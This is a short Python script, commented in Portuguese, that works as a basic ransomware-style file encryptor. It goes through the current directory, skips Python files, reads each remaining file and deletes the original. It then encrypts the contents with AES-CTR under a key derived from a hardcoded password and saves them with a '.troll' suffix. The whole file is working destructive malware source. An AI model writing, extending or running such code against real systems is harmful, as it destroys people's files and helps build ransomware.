import os
import pyaes  # Advanced Encryption Standard
import hashlib
from pathlib import Path

target_folder = Path("./")

for file_path in target_folder.iterdir():
    # Ensure we only process files, not subdirectories
    if file_path.is_file():
        # file_path é um objeto Path, então possui .suffix
        if file_path.suffix == ".py":
            print(f"[IGNORADO] Arquivo Python: {file_path.name}")
            continue

    
        print(f"Processing file: {file_path}")
        # Criptografia e Descriptografia com IV
 
        file_name = file_path  # Use the full path of the file

        # 1. Gerar um IV aleatório de 16 bytes a cada execução
        iv = os.urandom(16)

        # 2. Ler o arquivo original
        with open(file_name, "rb") as f:
            file_data = f.read()

        # 3. Remover o arquivo original
        os.remove(file_name)

        # 4. Criar a chave e o cipher AES-CTR passando o IV gerado
        #key = b"minha-chave-secreta-com-32-bytes"  # 32 bytes (AES-256)

        # 4. Novo com qualquer senha do usuário, mas usando SHA-256 para gerar uma chave de 32 bytes
        # Qualquer senha funciona aqui agora
        senha_usuario = "minha_senha_curta"
        # O hashlib.sha256().digest() sempre retorna exatamente 32 bytes
        key = hashlib.sha256(senha_usuario.encode('utf-8')).digest()
        counter = pyaes.Counter(initial_value=int.from_bytes(iv, byteorder="big"))
        aes = pyaes.AESModeOfOperationCTR(key, counter=counter)


        # 5. Criptografar os dados
        crypto_data = aes.encrypt(file_data)

        # 6. Salvar o IV nos primeiros 16 bytes + o conteúdo criptografado
        new_file = file_name.with_suffix(file_name.suffix + ".troll")
        with open(new_file, "wb") as f:
            f.write(iv + crypto_data)  # Anexa o IV no início do arquivo